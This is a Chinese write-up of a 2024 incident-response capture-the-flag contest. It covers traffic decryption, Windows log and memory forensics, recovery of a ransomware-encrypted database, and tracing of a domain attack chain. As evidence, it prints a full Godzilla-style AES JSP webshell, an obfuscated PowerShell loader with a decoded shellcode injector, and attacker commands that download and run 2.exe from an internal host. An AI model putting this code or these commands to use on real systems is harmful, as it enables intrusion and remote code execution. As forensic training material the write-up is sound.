# 2024 第一届 Solar 应急响应挑战赛

## 签到

### 签到（邮件头溯源）

![](https://pic1.imgdb.cn/item/6900d73e3203f7be00aca5bf.png)

根据邮件头信息，邮件的发件顺序可以从最早的 `Received` 头部向后推断，首先是最初的邮件来源，依次通过多个邮件服务器转发。具体顺序如下：

1. **mail.solar.sec**
2. **mail.da4s8gag.com**
3. **newxmmxszc6-1.qq.com**

所以，flag的结果为

```
flag{mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com}
```

## 日志流量

### 日志流量-1（WebShell 查杀）

![](https://pic1.imgdb.cn/item/690066783203f7be00aab059.png)

查看流量包发现有对 b.jsp 的 POST 请求

![](https://pic1.imgdb.cn/item/690082c43203f7be00ab83ee.png)

手动查看 Tomcat 日志 `localhost_access_log`，这个里面会记录请求时间、资源、状态码

![](https://pic1.imgdb.cn/item/6902800d3203f7be00b279f8.png)

访问路径拿到 WebShell，至此第一小题解出

![](https://pic1.imgdb.cn/item/690280323203f7be00b27a4e.png)

使用 D 盾扫描出后门

![](https://pic1.imgdb.cn/item/690066dc3203f7be00aab41a.png)

拿到后门文件

```
E:\靶机\第一届solar应急响应比赛\【题目】小题+综合题\solar\1. 流量分析\web\apache-tomcat-9.0.96\work\Catalina\localhost\ROOT\org\apache\jsp
```

```java
/*
 * Generated by the Jasper component of Apache Tomcat
 * Version: Apache Tomcat/9.0.96
 * Generated at: 2024-12-16 09:23:36 UTC
 * Note: The last modified time of this file was set to
 *       the last modified time of the source file after
 *       generation to assist with modification tracking.
 */
package org.apache.jsp;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.jsp.*;

public final class b_jsp extends org.apache.jasper.runtime.HttpJspBase
    implements org.apache.jasper.runtime.JspSourceDependent,
                 org.apache.jasper.runtime.JspSourceImports {

 String code="ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0="; String xc="a2550eeab0724a69"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}

  private static final javax.servlet.jsp.JspFactory _jspxFactory =
          javax.servlet.jsp.JspFactory.getDefaultFactory();

  private static java.util.Map<java.lang.String,java.lang.Long> _jspx_dependants;

  private static final java.util.Set<java.lang.String> _jspx_imports_packages;

  private static final java.util.Set<java.lang.String> _jspx_imports_classes;

  static {
    _jspx_imports_packages = new java.util.LinkedHashSet<>(4);
    _jspx_imports_packages.add("javax.servlet");
    _jspx_imports_packages.add("javax.servlet.http");
    _jspx_imports_packages.add("javax.servlet.jsp");
    _jspx_imports_classes = null;
  }

  private volatile javax.el.ExpressionFactory _el_expressionfactory;
  private volatile org.apache.tomcat.InstanceManager _jsp_instancemanager;

  public java.util.Map<java.lang.String,java.lang.Long> getDependants() {
    return _jspx_dependants;
  }

  public java.util.Set<java.lang.String> getPackageImports() {
    return _jspx_imports_packages;
  }

  public java.util.Set<java.lang.String> getClassImports() {
    return _jspx_imports_classes;
  }

  public javax.el.ExpressionFactory _jsp_getExpressionFactory() {
    if (_el_expressionfactory == null) {
      synchronized (this) {
        if (_el_expressionfactory == null) {
          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();
        }
      }
    }
    return _el_expressionfactory;
  }

  public org.apache.tomcat.InstanceManager _jsp_getInstanceManager() {
    if (_jsp_instancemanager == null) {
      synchronized (this) {
        if (_jsp_instancemanager == null) {
          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());
        }
      }
    }
    return _jsp_instancemanager;
  }

  public void _jspInit() {
  }

  public void _jspDestroy() {
  }

  public void _jspService(final javax.servlet.http.HttpServletRequest request, final javax.servlet.http.HttpServletResponse response)
      throws java.io.IOException, javax.servlet.ServletException {

    if (!javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) {
      final java.lang.String _jspx_method = request.getMethod();
      if ("OPTIONS".equals(_jspx_method)) {
        response.setHeader("Allow","GET, HEAD, POST, OPTIONS");
        return;
      }
      if (!"GET".equals(_jspx_method) && !"POST".equals(_jspx_method) && !"HEAD".equals(_jspx_method)) {
        response.setHeader("Allow","GET, HEAD, POST, OPTIONS");
        response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, "JSPs only permit GET, POST or HEAD. Jasper also permits OPTIONS");
        return;
      }
    }

    final javax.servlet.jsp.PageContext pageContext;
    javax.servlet.http.HttpSession session = null;
    final javax.servlet.ServletContext application;
    final javax.servlet.ServletConfig config;
    javax.servlet.jsp.JspWriter out = null;
    final java.lang.Object page = this;
    javax.servlet.jsp.JspWriter _jspx_out = null;
    javax.servlet.jsp.PageContext _jspx_page_context = null;


    try {
      response.setContentType("text/html");
      pageContext = _jspxFactory.getPageContext(this, request, response,
      			null, true, 8192, true);
      _jspx_page_context = pageContext;
      application = pageContext.getServletContext();
      config = pageContext.getServletConfig();
      session = pageContext.getSession();
      out = pageContext.getOut();
      _jspx_out = out;

try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}

    } catch (java.lang.Throwable t) {
      if (!(t instanceof javax.servlet.jsp.SkipPageException)){
        out = _jspx_out;
        if (out != null && out.getBufferSize() != 0)
          try {
            if (response.isCommitted()) {
              out.flush();
            } else {
              out.clearBuffer();
            }
          } catch (java.io.IOException e) {}
        if (_jspx_page_context != null) _jspx_page_context.handlePageException(t);
        else throw new ServletException(t);
      }
    } finally {
      _jspxFactory.releasePageContext(_jspx_page_context);
    }
  }
}

```

解密其中的 Base64 拿到 flag

![](https://pic1.imgdb.cn/item/69006e523203f7be00aaf540.png)

### 日志流量-2（哥斯拉 JAVA_AES_RAW 木马解密）

![](https://pic1.imgdb.cn/item/69006fd13203f7be00aafcfa.png)

**哥斯拉流量特征：**

1. **User-Agent（弱特征）**：在默认的情况下，如果不修改 User-Agent，User-Agent 会类似于 Java/1.8.0_121（具体什么版本取决于 JDK 环境版本）。但是哥斯拉支持自定义 HTTP 头部，这个默认特征是可以很容易去除的
2. **Accept（弱特征）**：Accept 为 text/html, image/gif, image/jpeg, *; q=.2, /; q=.2
3. **Cookie (强特征)**：在请求包的Cookie中有一个非常致命的特征，最后的分号
4. **响应三次（强特征）**：第一个请求会发送大量数据，该请求不含有任何 Cookie 信息，服务器响应报文不含任何数据，但是会设置 PHPSESSID，后续请求都会自动带上该 Cookie
5. **哥斯拉加密方式（强特征）**：Base64 + AES + Gunzip
6. **Connection**：会长时间为 keep-alive

追踪第一个请求的 HTTP 流发现没有 Cookie（HTTP 流 3）

![](https://pic1.imgdb.cn/item/690280fd3203f7be00b27c4c.png)

服务器响应并且设置了 Cookie

![](https://pic1.imgdb.cn/item/690281333203f7be00b27cc0.png)

打开 `wire.pcapng` 流量包，过滤 HTTP 流，提取请求包中的 Data 段解密

![](https://pic1.imgdb.cn/item/690082c43203f7be00ab83ee.png)

解密时需要复制密文的十六进制，然后使用 AES 解密，最后使用 Gunzip() 解压缩，因为哥斯拉传输数据时使用 Gunzip 压缩。返回包不需要去掉前后的 16 位

![](https://pic1.imgdb.cn/item/690082883203f7be00ab8305.png)

在 7224 找到读取 flag 的痕迹

![](https://pic1.imgdb.cn/item/690083473203f7be00ab8544.png)

查看响应拿到 flag

![](https://pic1.imgdb.cn/item/690083883203f7be00ab860a.png)

### 日志流量-3（哥斯拉 JAVA_AES_RAW 木马解密）

![](https://pic1.imgdb.cn/item/690086ee3203f7be00ab9789.png)

在流 6 发现一个较大的文件

![](https://pic1.imgdb.cn/item/6900872b3203f7be00ab99e2.png)

解密发现是 PDF，保存

![](https://pic1.imgdb.cn/item/690087713203f7be00ab9bb4.png)

打开拿到 flag

![](https://pic1.imgdb.cn/item/6900879d3203f7be00ab9d20.png)

## 数据库

### 数据库-1（新用户创建的事件 ID）

![](https://pic1.imgdb.cn/item/6900baae3203f7be00ac8301.png)

虚拟机密码是 Password@123，查看安全日志找事件 ID 为 4720 的事件，注意时间就行

![](https://pic1.imgdb.cn/item/6900bcf43203f7be00ac8df7.png)

### 数据库-2（后台进程找恶意文件）

![](https://pic1.imgdb.cn/item/6900c0cc3203f7be00ac9c41.png)

一眼过去只有它不正常

![](https://pic1.imgdb.cn/item/6900c0f03203f7be00ac9c57.png)

右键打开文件所在位置拿到文件名

![](https://pic1.imgdb.cn/item/6900c1183203f7be00ac9c61.png)

### 数据库-3（Netstat 找外联 IP）

![](https://pic1.imgdb.cn/item/6900c16b3203f7be00ac9c80.png)

直接 `netstat -ano` 找到

**（注意：提交时要写 203.107.45.167，这是当时比赛的外联 IP）**

![](https://pic1.imgdb.cn/item/6900c18b3203f7be00ac9c8b.png)

当然你去翻 `config.json` 也能找到对应的域名

![](https://pic1.imgdb.cn/item/6900c1ce3203f7be00ac9cab.png)

解析后拿到 IP 也行

![](https://pic1.imgdb.cn/item/6900c1fe3203f7be00ac9cba.png)

### 数据库-4（D-Recovery SQL Server 修复数据库）

![](https://pic1.imgdb.cn/item/6900c4d43203f7be00ac9dfa.png)

数据库文件被勒索软件加密了，搜索发现是 lockbit 家族

![](https://pic1.imgdb.cn/item/690111823203f7be00acd08f.png)

使用数据库修复工具 D-Recovery SQL Server 进行修复

由于加密损坏了表结构，因此首先需要准备一个表结构一致的 mdf 作为参照 mdf（官方附件中有）

通过 Everything 搜索其对应的关键字找到加密文件

![](https://pic1.imgdb.cn/item/6900c89c3203f7be00ac9f7d.png)

先点击左上角打开我们的加密文件

![](https://pic1.imgdb.cn/item/6900cca93203f7be00aca167.png)

参照 MDF 文件选择我们官方附件里的，点击开始恢复

![](https://pic1.imgdb.cn/item/6900ccd93203f7be00aca183.png)

恢复成功

![](https://pic1.imgdb.cn/item/6900cc8a3203f7be00aca156.png)

依次恢复找到 flag

![](https://pic1.imgdb.cn/item/6900cda23203f7be00aca1d8.png)

### 数据库-5（PowerShell 日志分析）

![](https://pic1.imgdb.cn/item/6900cf243203f7be00aca271.png)

翻日志找到可疑操作

![](https://pic1.imgdb.cn/item/6900d1a33203f7be00aca37d.png)

发现有使用 Base64 解码

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('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{0}')-f'A','f','M')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

解密后点击小魔棒识别

![](https://pic1.imgdb.cn/item/6900d2e73203f7be00aca3f3.png)

发现是 Gzip

![](https://pic1.imgdb.cn/item/6900d26e3203f7be00aca3cf.png)

添加 Gunzip 拿到源码

![](https://pic1.imgdb.cn/item/6900d2fb3203f7be00aca3fb.png)

发现还使用了一次 Base64 编码

```
function tWk {
        Param ($k0M, $ybp)
        $f2w = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $f2w.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($f2w.GetMethod('GetModuleHandle')).Invoke($null, @($k0M)))), $ybp))
}

function lVhI5 {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $v8K8,
                [Parameter(Position = 1)] [Type] $nZWM = [Void]
        )

        $p8dl = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $p8dl.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $v8K8).SetImplementationFlags('Runtime, Managed')
        $p8dl.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $nZWM, $v8K8).SetImplementationFlags('Runtime, Managed')

        return $p8dl.CreateType()
}

[Byte[]]$tUZml = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$uKrz = 0
$rS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualAlloc), (lVhI5 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tUZml.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($tUZml, 0, $rS, $tUZml.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualProtect), (lVhI5 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($rS, [Uint32]$tUZml.Length, 0x10, [Ref]$uKrz)) -eq $true) {
        $yfm6I = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll CreateThread), (lVhI5 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$rS,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll WaitForSingleObject), (lVhI5 @([IntPtr], [Int32]))).Invoke($yfm6I,0xffffffff) | Out-Null
}

```

继续解码识别出来了

![](https://pic1.imgdb.cn/item/6900d3743203f7be00aca432.png)

最后添加一个 MD5 即可

![](https://pic1.imgdb.cn/item/6900d3913203f7be00aca43f.png)

## 内存取证

### 内存取证-1（windows.netscan 找外联 IP）

![](https://pic1.imgdb.cn/item/6900e3603203f7be00aca9b7.png)

RDP 一般开放在 3389 端口，直接查看 `windows.netscan` 就行

```bash
vol -f '/home/kali/SERVER-2008-20241220-162057.raw' windows.netscan
```

![](https://pic1.imgdb.cn/item/6900e4db3203f7be00acaa22.png)

### 内存取证-2（cmdscan 查看历史命令）

![](https://pic1.imgdb.cn/item/6900ebb93203f7be00acad53.png)

这里只能用 vol2 才能查出来

```bash
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 cmdscan
```

![](https://pic1.imgdb.cn/item/6900ec343203f7be00acad85.png)

### 内存取证-3（windows.filescan 查找文件）

![](https://pic1.imgdb.cn/item/6900ed063203f7be00acade2.png)

执行 `windows.cmdline` 命令发现使用记事本开了一个文件

![](https://pic1.imgdb.cn/item/6900ed333203f7be00acaded.png)

扫描文件

```bash
vol -f '/home/kali/SERVER-2008-20241220-162057.raw' windows.filescan | grep "pass.txt"
```

![](https://pic1.imgdb.cn/item/6900eda53203f7be00acae19.png)

dump 出来

```bash
vol -f '/home/kali/SERVER-2008-20241220-162057.raw' windows.dumpfiles --physaddr 0x7e4cedd0
```

![](https://pic1.imgdb.cn/item/6900ee5a3203f7be00acaf01.png)

查看拿到密码

![](https://pic1.imgdb.cn/item/6900ee973203f7be00acaf36.png)

### 内存取证-4（windows.filescan 查找文件）

![](https://pic1.imgdb.cn/item/6900efff3203f7be00acaff1.png)

先找到日志文件的位置，选择第二个

```bash
vol -f '/home/kali/SERVER-2008-20241220-162057.raw' windows.filescan | grep "Security.evtx"
```

![](https://pic1.imgdb.cn/item/6900f1ad3203f7be00acb10f.png)

找到新创建的用户

![](https://pic1.imgdb.cn/item/6900f1c53203f7be00acb124.png)

### 内存取证-5（远程登录成功的事件 ID）

![](https://pic1.imgdb.cn/item/6900f21f3203f7be00acb17a.png)

接着上一个文件看 ID 为 4624 的就行

![](https://pic1.imgdb.cn/item/6900f2623203f7be00acb1c0.png)

### 内存取证-6（hashdump 账号密码哈希值）

![](https://pic1.imgdb.cn/item/6900f41f3203f7be00acb697.png)

直接使用 vol2 插件 hashdump 即可

```bash
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 hashdump
```

![](https://pic1.imgdb.cn/item/6900f4453203f7be00acb716.png)

## 综合应急

### 综合应急（域渗透攻击链溯源）

攻击链如下

![](https://pic1.imgdb.cn/item/690956b93203f7be00cd41cd.png)

**先去找 MSSQL 弱口令登录，以下日志均为 sql01**

查看 **sql01** 的 Windows 事件日志的应用程序日志文件 `Application.evtx`

| 事件ID    | 含义与说明                                                   | 客户端信息示例          |
| :-------- | :----------------------------------------------------------- | :---------------------- |
| **18454** | **登录成功**：用户使用 **SQL Server 身份验证**（如 sa 账户）成功登录 | `[客户端: 10.0.100.85]` |
| 18453     | 登录成功：用户使用 **Windows 身份验证**成功登录              | `<local machine>`       |
| 18456     | 登录失败：例如密码错误或服务器仅配置了 Windows 身份验证      | `192.168.159.1`         |
| 18452     | 登录失败：通常因为服务器身份验证模式配置问题，例如在"仅 Windows"模式下尝试使用 SQL Server 账户登录 | `192.168.159.1`         |

在 2024/12/18 9:01:40 找到登录日志，确定了攻击的起始时间

![](https://pic1.imgdb.cn/item/690958ae3203f7be00cd429f.png)

接下来去找 `Sysmon` 日志，它记录以下事件 ID

| 事件ID    | 事件名称                 | 记录内容          | 安全价值                               |
| :-------- | :----------------------- | :---------------- | :------------------------------------- |
| **1**     | **进程创建**             | 新进程启动        | 检测恶意代码执行、可疑命令行           |
| **2**     | **文件创建时间**         | 文件时间戳变更    | 识别时间戳篡改（攻击者常用）           |
| **3**     | **网络连接**             | TCP/UDP 网络连接  | 检测 C&C 通信、横向移动                |
| **5**     | **进程终止**             | 进程结束          | 监控进程生命周期                       |
| **6**     | **驱动加载**             | 内核驱动加载      | 检测 Rootkit、恶意驱动                 |
| **7**     | **镜像加载**             | DLL 加载          | 检测 DLL 注入、恶意模块                |
| **8**     | **远程线程创建**         | 跨进程线程创建    | 检测进程注入、代码注入                 |
| **9**     | **RawAccessRead**        | 原始磁盘访问      | 检测 MBR 修改、磁盘扫描                |
| **10**    | **进程访问**             | 进程句柄请求      | 检测凭据窃取（如 LSASS 访问）          |
| **11**    | **文件创建**             | 新文件创建        | 检测恶意文件投放                       |
| **12-13** | **注册表事件**           | 注册表增删改      | 检测持久化机制                         |
| **15**    | **FileCreateStreamHash** | 文件流创建        | 检测隐藏数据（Alternate Data Streams） |
| **17-18** | **管道事件**             | 命名管道创建/连接 | 检测横向移动、IPC 通信                 |
| **19-21** | **WMI 事件**             | WMI 活动监控      | 检测无文件攻击、持久化                 |

在 2024/12/18 9:02:04 进程创建事件中找到执行的恶意命令

```
 "C:\Windows\System32\cmd.exe" /C powershell -c iwr -uri http://10.0.100.85:81/2.exe -o C:/windows/tasks/2.exe 
```

| 命令组件                           | 功能解析                 | 安全风险分析                    |
| :--------------------------------- | :----------------------- | :------------------------------ |
| `"C:\Windows\System32\cmd.exe" /C` | 启动 CMD 执行命令后退出  | 使用合法系统程序作掩护          |
| `powershell -c`                    | 执行 PowerShell 命令     | 攻击者常用工具，可无文件攻击    |
| `iwr`                              | Invoke-WebRequest 的别名 | PowerShell 的 HTTP 下载工具     |
| `-uri http://10.0.100.85:81/2.exe` | 指定下载源               | **内网IP+非常用端口，高度可疑** |
| `-o C:/windows/tasks/2.exe`        | 输出到系统目录           | **系统目录写入，为持久化准备**  |

![](https://pic1.imgdb.cn/item/69095d943203f7be00cd4481.png)

在下一个进程访问事件可以看到访问了 `clr.dll`

![](https://pic1.imgdb.cn/item/69095db83203f7be00cd4511.png)

然后加载了 `clr.dll`，镜像加载事件

![](https://pic1.imgdb.cn/item/6909635e3203f7be00cd482e.png)

继续往下看发现调用了木马

```
"C:\Windows\System32\cmd.exe" /C C:/windows/tasks/2.exe
```

![](https://pic1.imgdb.cn/item/69095e683203f7be00cd4561.png)

然后查找事件 ID 为 17 的管道事件

| 事件      | 时间戳         | 管道名称                         | 特点分析                         |
| :-------- | :------------- | :------------------------------- | :------------------------------- |
| **事件1** | `01:02:15.385` | `\qoletm`                        | 简短随机名，可能用于快速通信     |
| **事件2** | `01:02:15.385` | `\0029482318be6784`              | 纯数字随机名，典型的恶意软件命名 |
| **事件3** | `01:02:15.400` | `\4ae13d6c2cd672ae\pipe\spoolss` | **伪装成系统打印服务**           |

![](https://pic1.imgdb.cn/item/690961533203f7be00cd4789.png)

在 2024/12/18 9:02:18 中提权成功

![](https://pic1.imgdb.cn/item/690962083203f7be00cd47c4.png)

在注册表事件中发现有修改注册表的痕迹

![](https://pic1.imgdb.cn/item/690965c13203f7be00cd4948.png)

随后访问了 `lsass.exe` 获取了哈希

![](https://pic1.imgdb.cn/item/690966243203f7be00cd4969.png)

2024/12/18 9:03:27 使用 sql01 账户通过 WMI 连接服务器

![](https://pic1.imgdb.cn/item/690966ed3203f7be00cd49ab.png)

2024/12/18 9:03:28 网络连接事件中连接到了 `10.0.10.40` 主机

![](https://pic1.imgdb.cn/item/6909682e3203f7be00cd4b7a.png)

2024/12/18 9:03:54 随后创建了账号密码

![](https://pic1.imgdb.cn/item/690968783203f7be00cd4c08.png)

2024/12/18 9:04:12 将账号添加到管理员组提权

![](https://pic1.imgdb.cn/item/690969283203f7be00cd4d23.png)

进行了 DNS 查询

![](https://pic1.imgdb.cn/item/69096af23203f7be00cd547c.png)

2024/12/18 9:11:15 修改 administrator 密码

![](https://pic1.imgdb.cn/item/69096bb43203f7be00cd5d74.png)

| 登录类型 (Logon Type) | 含义               | 常见场景                                                     |
| :-------------------- | :----------------- | :----------------------------------------------------------- |
| **2**                 | **交互式登录**     | **在本地控制台登录**，或者通过 **RDP 远程桌面**登录          |
| **3**                 | **网络登录**       | 通过网络共享访问文件、通过 WMI/PsExec 执行命令等             |
| **4**                 | **批处理登录**     | 通过计划任务执行的脚本或程序                                 |
| **5**                 | **服务登录**       | 服务控制管理器启动服务                                       |
| **7**                 | **解锁**           | 解锁已锁定的屏幕                                             |
| **8**                 | **网络明文登录**   | 类似类型 3，但凭据以明文传输                                 |
| **9**                 | **新凭据**         | 使用 `RunAs` 命令在同一登录会话中切换账户                    |
| **10**                | **远程交互式登录** | **RDP 登录的明确标识** (在较新版本的 Windows Server，如 2012 R2 及之后) |
| **11**                | **缓存交互式登录** | 在无法联系域控制器时，使用缓存的凭据登录                     |

在 `Security` 日志中发现修改账号密码的痕迹于 2024/12/18 9:11:15

![](https://pic1.imgdb.cn/item/690975403203f7be00cd9030.png)

后续发现登录成功于 2024/12/18 9:11:24，登录类型是 3

![](https://pic1.imgdb.cn/item/690976283203f7be00cd925f.png)

**4624 登录判断技巧：源网络地址是否是 ::1 本地**

![](https://pic1.imgdb.cn/item/690c05183203f7be00da1d7a.png)

查看防火墙日志文件发现在这个时间段规则被删除了

```
Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx
```

![](https://pic1.imgdb.cn/item/690978c03203f7be00cd9b98.png)

攻击者使用 sql01 账户登陆 sql02 数据库，之后执行命令下载木马并执行木马，提权后修改了 sql02 本地管理员administrator 密码**（拿下了 sql02）**

**该日志是 sql02 的日志**

![](https://pic1.imgdb.cn/item/69097d283203f7be00cdbcc2.png)

**以下日志均为 web01**

在 **web01** 中的 `Windows PowerShell` 日志中发现被 RCE 下载了恶意文件

```
powershell -c iwr -uri http://10.0.100.85:81/2.exe -o C:/windows/tasks/2.exe
```

![](https://pic1.imgdb.cn/item/69099bd43203f7be00ce2b5c.png)

后续于 2024/12/18 9:22:26 被执行了

![](https://pic1.imgdb.cn/item/69099cc93203f7be00ce32b9.png)

接下来去看 `Microsoft-Windows-PowerShell/Operational` 日志

它专门用于记录 **PowerShell 引擎的详细运行状态和脚本执行细节**，为系统管理员和安全分析师提供深度的可见性

2024/12/18 9:26:46.000 创建调用 PowerView.ps1

![](https://pic1.imgdb.cn/item/690b030b3203f7be00d5bb1b.png)

随后发现有创建管道

你可以把 **命名管道** 想象成一条 **数据输送管**：

- **管道**：允许两个进程之间传输数据
- **命名**：这条管道有一个唯一的名字（比如 `\\.\pipe\MySecretPipe`），其他进程只要知道这个名字，就能找到并连接它

